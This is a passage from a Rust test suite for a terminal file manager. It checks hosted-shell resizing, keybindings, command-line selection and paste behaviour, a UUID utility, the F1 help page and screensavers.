            "a panel with the keyboard must have no cursor"
        );

        app.handle(Action::ToggleShell);
        assert_eq!(app.ses().view, View::Shell);

        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(3);
        while !app.wants_text_cursor() && std::time::Instant::now() < deadline {
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        assert!(
            app.wants_text_cursor(),
            "the hosted shell never showed a cursor"
        );
        assert!(
            app.shows_text_cursor(),
            "and its style is never re-asserted"
        );
    }

    /// A terminal program only learns it was resized because the terminal tells
    /// it. Doing that lazily is why a hosted `vim` kept the old geometry until
    /// the next keystroke.
    #[cfg(unix)]
    #[test]
    fn resizing_reaches_the_hosted_shell_without_a_keystroke() {
        let mut app = fixture();
        app.handle(Action::ToggleShell);

        let mut small = Terminal::new(TestBackend::new(80, 24)).unwrap();
        small.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        app.sync_shell_size();
        let before = app.ses().hosted().map(|s| s.size()).expect("a shell");

        let mut big = Terminal::new(TestBackend::new(140, 40)).unwrap();
        big.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        app.sync_shell_size();
        let after = app.ses().hosted().map(|s| s.size()).expect("a shell");

        assert_ne!(before, after, "the child was never told the window changed");
        assert!(
            after.0 > before.0 && after.1 > before.1,
            "expected a bigger pty than {before:?}, got {after:?}"
        );
    }

    /// Ctrl-Shift-U has to reach the menu from wherever the user is, including
    /// from inside a hosted shell — a utilities menu you can only open from one
    /// view is one you stop reaching for.
    #[test]
    fn ctrl_shift_u_opens_the_utilities_menu_everywhere() {
        use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let ctrl_shift_u = KeyEvent::new(
            KeyCode::Char('u'),
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        );
        for focus in [Focus::Panel, Focus::CommandLine] {
            assert_eq!(
                keymap::resolve(ctrl_shift_u, focus),
                Some(Action::UtilitiesMenu),
                "{focus:?}"
            );
        }

        let mut app = fixture();
        app.on_key(ctrl_shift_u);
        assert!(
            matches!(app.mode, Mode::Utilities { .. }),
            "from the panels"
        );

        let mut app = fixture();
        app.handle(Action::ToggleShell);
        assert_eq!(app.ses().view, View::Shell);
        app.on_key(ctrl_shift_u);
        assert!(
            matches!(app.mode, Mode::Utilities { .. }),
            "the shell swallowed it"
        );
    }

    /// Plain Ctrl-U is readline's kill-line. Swallowing it would break every
    /// shell the file manager hosts, so in the shell view it goes to the child.
    #[test]
    fn plain_ctrl_u_still_belongs_to_the_shell() {
        use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let mut app = fixture();
        app.handle(Action::ToggleShell);
        app.on_key(KeyEvent::new(KeyCode::Char('u'), KeyModifiers::CONTROL));
        assert_eq!(app.mode, Mode::Normal, "the menu stole the shell's Ctrl-U");
        assert_eq!(app.ses().view, View::Shell);
    }

    /// Ctrl-Tab and Ctrl-Shift-Tab move between sessions, in both the spellings
    /// terminals use for the shifted one.
    #[test]
    fn ctrl_tab_cycles_sessions_in_either_encoding() {
        use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let ctrl = KeyModifiers::CONTROL;
        let ctrl_shift = KeyModifiers::CONTROL | KeyModifiers::SHIFT;
        assert_eq!(
            keymap::resolve(KeyEvent::new(KeyCode::Tab, ctrl), Focus::Panel),
            Some(Action::CycleSession(1))
        );
        for shifted in [
            KeyEvent::new(KeyCode::Tab, ctrl_shift),
            KeyEvent::new(KeyCode::BackTab, ctrl_shift),
            KeyEvent::new(KeyCode::BackTab, ctrl),
        ] {
            assert_eq!(
                keymap::resolve(shifted, Focus::Panel),
                Some(Action::CycleSession(-1)),
                "{shifted:?}"
            );
        }
        // Bare Shift-Tab still opens the rail; the Ctrl arms must not shadow it.
        assert_eq!(
            keymap::resolve(
                KeyEvent::new(KeyCode::BackTab, KeyModifiers::SHIFT),
                Focus::Panel
            ),
            Some(Action::ToggleRail)
        );
    }

    /// Switching sessions from inside a shell is most of what several sessions
    /// are for: start something long-running, then go and look at another one.
    // A runtime, because leaving a session re-lists the one arrived at, and
    // listings are spawned tasks.
    #[tokio::test]
    async fn sessions_are_reachable_from_inside_the_shell() {
        use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let mut app = fixture();
        app.handle(Action::NewSession);
        app.mode = Mode::Normal;
        let before = app.sessions.current().id;

        app.handle(Action::ToggleShell);
        app.on_key(KeyEvent::new(KeyCode::Tab, KeyModifiers::CONTROL));
        assert_ne!(
            app.sessions.current().id,
            before,
            "Ctrl-Tab did not leave the session"
        );
    }

    /// Shift-Tab belongs to whatever is hosted: `claude` cycles its permission
    /// modes on it, and a rail that opened instead would be pressing a key
    /// inside somebody else's program. In the panels it still opens the rail —
    /// there is nothing there to take it from.
    #[tokio::test]
    async fn shift_tab_belongs_to_the_hosted_program() {
        use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let mut app = fixture();
        app.handle(Action::ToggleShell);
        assert_eq!(app.ses().view, View::Shell);

        // Both spellings terminals use for it, bare and with the Shift flag.
        for k in [
            KeyEvent::from(KeyCode::BackTab),
            KeyEvent::new(KeyCode::BackTab, KeyModifiers::SHIFT),
            KeyEvent::new(KeyCode::Tab, KeyModifiers::SHIFT),
        ] {
            app.on_key(k);
            assert!(!app.rail_open, "the rail took {k:?} from the shell");
            assert_eq!(app.mode, Mode::Normal, "{k:?}");
            assert_eq!(app.ses().view, View::Shell, "{k:?}");
        }

        // The rail is still one key away from in here — a key no terminal has
        // an opinion about.
        app.on_key(KeyEvent::new(KeyCode::Char('t'), KeyModifiers::CONTROL));
        assert!(app.rail_open, "Ctrl-T no longer opens the rail");
    }

    /// A selection you cannot see is one you cannot trust, and this one decides
    /// what Copy puts on the clipboard.
    #[test]
    fn the_command_line_selection_is_drawn_inverted() {
        let mut app = fixture();
        app.ses_mut().focus = Focus::CommandLine;
        for c in "echo ciao".chars() {
            app.handle(Action::CommandChar(c));
        }
        for _ in 0..4 {
            app.handle(Action::ExtendCommandSelection(-1));
        }
        assert_eq!(app.command_selection_text().as_deref(), Some("ciao"));

        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let buf = term.backend().buffer();
        let inverted: String = (0..80)
            .map(|x| buf[(x, 22)].clone())
            .filter(|c| {
                c.style()
                    .add_modifier
                    .contains(ratatui::style::Modifier::REVERSED)
            })
            .map(|c| c.symbol().to_string())
            .collect();
        assert_eq!(inverted, "ciao", "the highlight is on the wrong characters");
    }

    /// Shift+Left then Shift+Right lands back where it started, and back at the
    /// anchor is no selection rather than an empty one — an empty selection
    /// would make Copy replace the clipboard with nothing.
    #[test]
    fn coming_back_to_the_anchor_clears_the_selection() {
        let mut app = fixture();
        app.ses_mut().focus = Focus::CommandLine;
        for c in "abc".chars() {
            app.handle(Action::CommandChar(c));
        }
        app.handle(Action::ExtendCommandSelection(-1));
        assert_eq!(app.command_selection_text().as_deref(), Some("c"));
        app.handle(Action::ExtendCommandSelection(1));
        assert!(app.command_selection.is_none());
        assert!(app.command_selection_text().is_none());
    }

    #[test]
    fn selecting_to_the_start_takes_the_whole_line() {
        let mut app = fixture();
        app.ses_mut().focus = Focus::CommandLine;
        for c in "ls -la".chars() {
            app.handle(Action::CommandChar(c));
        }
        app.handle(Action::ExtendCommandSelectionToStart);
        assert_eq!(app.command_selection_text().as_deref(), Some("ls -la"));
    }

    /// Typing over a selection replaces it, as in every editor. Appending past
    /// it would leave a highlight sitting over text that is no longer selected.
    #[test]
    fn typing_replaces_what_was_selected() {
        let mut app = fixture();
        app.ses_mut().focus = Focus::CommandLine;
        for c in "echo ciao".chars() {
            app.handle(Action::CommandChar(c));
        }
        for _ in 0..4 {
            app.handle(Action::ExtendCommandSelection(-1));
        }
        app.handle(Action::CommandChar('x'));
        assert_eq!(app.ses().command_line, "echo x");
        assert!(app.command_selection.is_none());
    }

    /// Backspace on a selection deletes the selection, not the character before
    /// it — deleting one character out of five the user asked to remove is the
    /// kind of wrong that is only noticed afterwards.
    #[test]
    fn backspace_deletes_the_selection() {
        let mut app = fixture();
        app.ses_mut().focus = Focus::CommandLine;
        for c in "rm -rf tmp".chars() {
            app.handle(Action::CommandChar(c));
        }
        for _ in 0..3 {
            app.handle(Action::ExtendCommandSelection(-1));
        }
        app.handle(Action::CommandBackspace);
        assert_eq!(app.ses().command_line, "rm -rf ");
    }

    /// Char offsets, not byte offsets: slicing a multi-byte character down the
    /// middle panics rather than misbehaving quietly.
    #[test]
    fn selection_offsets_survive_multibyte_text() {
        let mut app = fixture();
        app.ses_mut().focus = Focus::CommandLine;
        for c in "echo 日本語".chars() {
            app.handle(Action::CommandChar(c));
        }
        for _ in 0..3 {
            app.handle(Action::ExtendCommandSelection(-1));
        }
        assert_eq!(app.command_selection_text().as_deref(), Some("日本語"));
        app.handle(Action::CommandBackspace);
        assert_eq!(app.ses().command_line, "echo ");
    }

    /// Shift+Left has to mean the command line, not the panel selection.
    #[test]
    fn shift_left_and_right_are_the_command_line_selection() {
        use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        for (code, want) in [
            (KeyCode::Left, Action::ExtendCommandSelection(-1)),
            (KeyCode::Right, Action::ExtendCommandSelection(1)),
        ] {
            assert_eq!(
                keymap::resolve(KeyEvent::new(code, KeyModifiers::SHIFT), Focus::CommandLine),
                Some(want)
            );
        }
        // Shift+Home still belongs to the panel when a panel has the keyboard.
        assert_eq!(
            keymap::resolve(
                KeyEvent::new(KeyCode::Home, KeyModifiers::SHIFT),
                Focus::Panel
            ),
            Some(Action::ExtendSelectionToTop)
        );
    }

    /// The terminal's own paste — Cmd-V in most terminals — arrives as one
    /// event, not as keystrokes. Dropping it, which is what used to happen, is
    /// the whole of "paste does not work": the key the terminal handles
    /// produces nothing at all.
    #[test]
    fn the_terminals_own_paste_reaches_the_command_line() {
        use ratatui::crossterm::event::Event;
        let mut app = fixture();
        app.ses_mut().focus = Focus::CommandLine;
        app.on_input(Event::Paste("echo pasted".into()));
        assert_eq!(app.ses().command_line, "echo pasted");
    }

    /// A paste is text, not a decision to run three commands.
    /// A utility run from the shell view has to put its answer where the user
    /// is looking. The command line is not drawn there at all, so text sent to
    /// it goes nowhere the user can see — which is exactly what happened: a
    /// uuid generated while talking to an agent was found afterwards, sitting
    /// on the commander's command line behind it.
    #[cfg(unix)]
    #[test]
    fn a_utility_run_from_the_shell_types_into_the_child() {
        let mut app = fixture();
        app.handle(Action::ToggleShell);
        let mut term = Terminal::new(TestBackend::new(80, 12)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        app.sync_shell_size();

        app.handle(Action::UtilitiesMenu);
        app.run_utility(crate::utilities::Utility::Uuid);

        assert_eq!(
            app.ses().command_line,
            "",
            "the answer must not be parked on a command line nobody can see"
        );
        assert!(
            app.status.contains("shell"),
            "the status has to say where it went: {}",
            app.status
        );

        // And it really reached the child: the shell echoes what is typed at
        // its prompt, so the uuid shows up on the screen the user is reading.
        let uuid = std::time::Instant::now() + std::time::Duration::from_secs(5);
        let mut seen = String::new();
        while std::time::Instant::now() < uuid {
            seen = app
                .ses()
                .hosted()
                .and_then(|sh| sh.with_screen(|s| s.contents()))
                .unwrap_or_default();
            if seen.split_whitespace().any(is_uuid) {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        assert!(
            seen.split_whitespace().any(is_uuid),
            "no uuid was typed into the shell; it shows:\n{seen}"
        );
    }

    fn is_uuid(w: &str) -> bool {
        w.len() == 36
            && w.chars().enumerate().all(|(i, c)| match i {
                8 | 13 | 18 | 23 => c == '-',
                _ => c.is_ascii_hexdigit(),
            })
    }

    #[test]
    fn a_multi_line_paste_arrives_as_one_line() {
        use ratatui::crossterm::event::Event;
        let mut app = fixture();
        app.ses_mut().focus = Focus::CommandLine;
        app.on_input(Event::Paste("one\ntwo\r\nthree\n".into()));
        assert_eq!(app.ses().command_line, "one two three");
        assert!(!app.ses().command_line.contains('\n'));
    }

    /// A menu is not a place to paste into, and the keystroke that opened it
    /// has already been spent.
    #[test]
    fn a_paste_into_a_menu_is_ignored() {
        use ratatui::crossterm::event::Event;
        let mut app = fixture();
        app.handle(Action::UtilitiesMenu);
        app.on_input(Event::Paste("nonsense".into()));
        assert_eq!(app.ses().command_line, "");
    }

    /// Cmd-C and Cmd-V for terminals that forward the Command key rather than
    /// keeping it — which is most of what people press on a Mac.
    #[test]
    fn the_command_key_copies_and_pastes() {
        use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let cmd = KeyModifiers::SUPER;
        assert_eq!(
            keymap::resolve(KeyEvent::new(KeyCode::Char('c'), cmd), Focus::CommandLine),
            Some(Action::ClipboardCopy)
        );
        assert_eq!(
            keymap::resolve(KeyEvent::new(KeyCode::Char('v'), cmd), Focus::CommandLine),
            Some(Action::ClipboardPaste)
        );
        // Without the Command key, `v` is still just a character to type.
        assert_eq!(
            keymap::resolve(
                KeyEvent::new(KeyCode::Char('v'), KeyModifiers::NONE),
                Focus::CommandLine
            ),
            Some(Action::CommandChar('v'))
        );
    }

    /// Ctrl-H is byte 0x08, which is also Backspace: only a terminal that
    /// encodes modifiers separately can tell them apart. The shifted forms are
    /// unambiguous everywhere that can send them at all.
    #[test]
    fn the_history_opens_on_every_spelling_of_its_key() {
        use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        for m in [
            KeyModifiers::CONTROL,
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
            KeyModifiers::SUPER,
            KeyModifiers::SUPER | KeyModifiers::SHIFT,
        ] {
            assert_eq!(
                keymap::resolve(KeyEvent::new(KeyCode::Char('h'), m), Focus::Panel),
                Some(Action::DirectoryHistory),
                "{m:?}"
            );
        }
        // Backspace stays Backspace; the history must not eat it.
        assert_ne!(
            keymap::resolve(
                KeyEvent::new(KeyCode::Backspace, KeyModifiers::NONE),
                Focus::CommandLine
            ),
            Some(Action::DirectoryHistory)
        );
    }

    /// A released binary has no source tree to build, and must restart rather
    /// than refuse.
    #[test]
    fn recycle_only_builds_when_there_is_something_to_build() {
        // `source_tree` reads the running binary's path. Under `cargo test`
        // that is `target/debug/deps/...`, which is one level deeper than a
        // real build — so this asserts the shape of the answer, not a verdict.
        if let Some((root, profile)) = App::source_tree() {
            assert!(root.join("Cargo.toml").is_file(), "{root:?}");
            assert!(!profile.is_empty());
        }
    }

    /// The status bar has one line; spending it on "Compiling dmac-core" helps
    /// nobody when there is an error further down.
    #[test]
    fn a_failed_build_reports_the_error_not_the_progress() {
        let stderr = "   Compiling dmac-core v0.1.0\n   Compiling dmac-tui v0.1.0\nerror[E0308]: mismatched types\n  --> src/lib.rs:1:1\n";
        assert!(
            first_error(stderr).starts_with("error[E0308]"),
            "{}",
            first_error(stderr)
        );
        // Nothing that looks like an error: say the last thing it did say.
        assert_eq!(
            first_error("warning: unused\nFinished in 2s"),
            "Finished in 2s"
        );
        assert_eq!(first_error(""), "no output");
    }
    // ---- the help page ----

    /// F1 opens the help over the panels; Esc closes it, and so does F1 again.
    #[test]
    fn f1_opens_the_help_and_esc_closes_it() {
        let mut app = fixture();
        app.on_key(key(KeyCode::F(1)));
        assert_eq!(app.mode, Mode::Help { scroll: 0 });
        app.on_key(key(KeyCode::Esc));
        assert_eq!(app.mode, Mode::Normal);
        app.on_key(key(KeyCode::F(1)));
        app.on_key(key(KeyCode::F(1)));
        assert_eq!(app.mode, Mode::Normal, "F1 must also close it");
    }

    /// The help scrolls, and never past its end or before its start.
    #[test]
    fn the_help_scrolls_and_stops_at_the_ends() {
        let mut app = fixture();
        app.on_key(key(KeyCode::F(1)));
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let area = app.layout.help;
        assert!(area.height > 0, "the help was not drawn");
        let max = crate::ui::help::page_len(area.width as usize) - area.height as usize;
        assert!(
            max > 0,
            "the page fits in 24 rows; the test needs a longer one"
        );

        app.on_key(key(KeyCode::Down));
        assert_eq!(app.mode, Mode::Help { scroll: 1 });
        app.on_key(key(KeyCode::End));
        assert_eq!(app.mode, Mode::Help { scroll: max });
        app.on_key(key(KeyCode::Down));
        assert_eq!(
            app.mode,
            Mode::Help { scroll: max },
            "scrolled past the end"
        );
        app.on_key(key(KeyCode::PageUp));
        assert_eq!(
            app.mode,
            Mode::Help {
                scroll: max - area.height as usize
            }
        );
        app.on_key(key(KeyCode::Home));
        assert_eq!(app.mode, Mode::Help { scroll: 0 });
        app.on_key(key(KeyCode::Up));
        assert_eq!(
            app.mode,
            Mode::Help { scroll: 0 },
            "scrolled before the start"
        );
    }

    /// The help renders at every size a terminal can be dragged to, and the
    /// frame stays exactly the terminal's size.
    #[test]
    fn the_help_renders_at_absurd_sizes() {
        let mut app = fixture();
        app.on_key(key(KeyCode::F(1)));
        for (w, h) in [
            (1u16, 1u16),
            (3, 2),
            (20, 5),
            (200, 1),
            (80, 24),
            (300, 100),
        ] {
            let mut term = Terminal::new(TestBackend::new(w, h)).unwrap();
            term.draw(|f| crate::ui::draw(f, &mut app))
                .unwrap_or_else(|e| panic!("draw failed at {w}x{h}: {e}"));
            assert_eq!(term.backend().buffer().area.width, w);
        }
    }

    /// The page says " Help " on its border and names F1 in its body: what is
    /// drawn is the help, not an empty box.
    #[test]
    fn the_help_shows_its_title_and_its_keys() {
        let mut app = fixture();
        app.on_key(key(KeyCode::F(1)));
        // The page arrives on a spiral, and this test is about what it says
        // rather than how it gets there: landed, so the words are readable.
        app.help_entrance = None;
        let mut term = Terminal::new(TestBackend::new(100, 40)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let buf = term.backend().buffer();
        let mut text = String::new();
        for y in 0..40 {
            for x in 0..100 {
                text.push_str(buf[(x, y)].symbol());
            }
            text.push('\n');
        }
        assert!(text.contains(" Help "), "no title on the border");
        assert!(text.contains("Panels"), "no section title");
        assert!(
            text.contains("Ctrl-R"),
            "no key on the first screen of the body"
        );
    }

    /// The help arrives rather than appearing, and a key lands it *and* acts.
    ///
    /// A key that only cancels an animation is a key that did not do what it
    /// says: pressing Down during the arrival has to scroll down a line, on a
    /// page that is now there to scroll.
    #[test]
    fn the_help_arrives_and_the_first_key_lands_it_without_being_eaten() {
        let mut app = fixture();
        app.on_key(key(KeyCode::F(1)));
        assert!(
            app.help_entrance.is_some(),
            "the help did not arrive, it appeared"
        );

        app.on_key(key(KeyCode::Down));
        assert!(app.help_entrance.is_none(), "the key did not land the page");
        assert_eq!(
            app.mode,
            Mode::Help { scroll: 1 },
            "the key was swallowed by the animation instead of scrolling"
        );

        // And closing it takes the arrival with it, so re-opening starts over
        // rather than resuming an animation from last time.
        app.on_key(key(KeyCode::Esc));
        assert_eq!(app.mode, Mode::Normal);
        assert!(app.help_entrance.is_none());
    }

    /// From a shell, Ctrl-O then F1: the chord leaves the shell and the key
    /// opens the help, so a hosted program keeps its own F1.
    #[test]
    fn ctrl_o_then_f1_opens_the_help_from_a_shell() {
        let mut app = fixture();
        app.handle(Action::ToggleShell);
        assert_eq!(app.ses().view, View::Shell);
        app.on_key(KeyEvent::new(KeyCode::Char('o'), KeyModifiers::CONTROL));
        assert_eq!(app.ses().view, View::Panels);
        app.on_key(key(KeyCode::F(1)));
        assert_eq!(app.mode, Mode::Help { scroll: 0 });
    }

    /// The wheel scrolls the help, and a click outside it closes it.
    #[test]
    fn the_mouse_scrolls_and_closes_the_help() {
        let mut app = fixture();
        app.on_key(key(KeyCode::F(1)));
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        app.on_mouse(MouseEvent {
            kind: MouseEventKind::ScrollDown,
            column: 40,
            row: 12,
            modifiers: KeyModifiers::NONE,
        });
        assert_eq!(app.mode, Mode::Help { scroll: 3 });
        app.on_mouse(click(MouseButton::Left, 0, 0));
        assert_eq!(app.mode, Mode::Normal, "a click outside must close it");
    }

    // ---- a screensaver on demand ----

    /// Shift-F12 starts a screensaver at once; pressed again it moves to the
    /// next one — as does the picker's key — and any other key dismisses it.
    #[test]
    fn shift_f12_starts_a_screensaver_and_then_walks_the_catalogue() {
        let mut app = fixture();
        let shift_f12 = KeyEvent::new(KeyCode::F(12), KeyModifiers::SHIFT);
        app.on_key(shift_f12);
        assert!(app.screensaver.is_active(), "Shift-F12 did not start one");
        let first = app.screensaver.current();
        app.on_key(shift_f12);
        assert!(app.screensaver.is_active(), "the second press dismissed it");
        assert_ne!(
            app.screensaver.current(),
            first,
            "the second press did not move on"
        );

        let second = app.screensaver.current();
        app.on_key(key(KeyCode::F(12)));
        assert!(app.screensaver.is_active(), "F12 dismissed it");
        assert_ne!(app.screensaver.current(), second, "F12 did not move on");

        // On to a screensaver before asking about dismissal. `next` walks the
        // games and the demos too — deliberately, since pressing the key is as
        // deliberate as choosing one from the picker — and those keep their
        // keys to steer with. "Any other key dismisses" is a promise about
        // screensavers, and this test used to make it of whichever effect the
        // random start happened to land on, which is what made it flaky.
        for _ in 0..dmac_fx::catalog().len() {
            if app
                .screensaver
                .current()
                .and_then(dmac_fx::entry)
                .is_some_and(|e| e.kind == dmac_fx::Kind::Screensaver)
            {
                break;
            }
            app.on_key(key(KeyCode::F(12)));
        }
        app.on_key(key(KeyCode::Char('x')));
        assert!(
            !app.screensaver.is_active(),
            "any other key must dismiss it"
        );
        assert_eq!(app.mode, Mode::Normal);
    }

    /// F12 in the picker starts the highlighted row: a screensaver in two
    /// presses of one key, in a terminal that cannot send Shift with an F-key.
    #[test]
    fn f12_twice_starts_a_screensaver() {
        let mut app = fixture();
        app.on_key(key(KeyCode::F(12)));
        assert_eq!(app.mode, Mode::Picker { selected: 0 });
        app.on_key(key(KeyCode::F(12)));
        assert_eq!(app.mode, Mode::Normal, "the picker must close");
        assert!(app.screensaver.is_active(), "F12 F12 did not start one");
    }

    /// Shift-F12 reaches the screensaver from inside a shell, where the bare
    /// key is the directory history.
    #[test]
    fn shift_f12_reaches_the_screensaver_from_a_shell() {
        let mut app = fixture();
        app.handle(Action::ToggleShell);
        assert_eq!(app.ses().view, View::Shell);
        app.on_key(KeyEvent::new(KeyCode::F(12), KeyModifiers::SHIFT));
        assert!(
            app.screensaver.is_active(),
            "Shift-F12 was swallowed by the shell"
        );
        app.on_key(key(KeyCode::Esc));
        assert!(!app.screensaver.is_active());
        app.on_key(key(KeyCode::F(12)));
        assert!(
            matches!(app.mode, Mode::History { .. }),
            "F12 in a shell is the history"
        );
    }

    /// The help page is what the cannon shoots at: the engine is handed it
    /// when the app is built, so every effect started later can have it.
    #[test]
    fn the_screensaver_engine_is_handed_the_help() {
        let mut app = fixture();
        app.screensaver
            .start_with(dmac_fx::build("cannon").unwrap(), 80, 30);
        // A frame is only drawn once one is due.
        std::thread::sleep(std::time::Duration::from_millis(60));
        let canvas = app.screensaver.update(80, 30).unwrap();
        let mut text = String::new();
        for row in canvas.rows() {
            text.extend(row.iter().map(|c| c.ch));
            text.push('\n');
        }
        assert!(
            text.contains("Panels"),
            "the cannon is not shooting at the help:\n{text}"
        );
    }
}
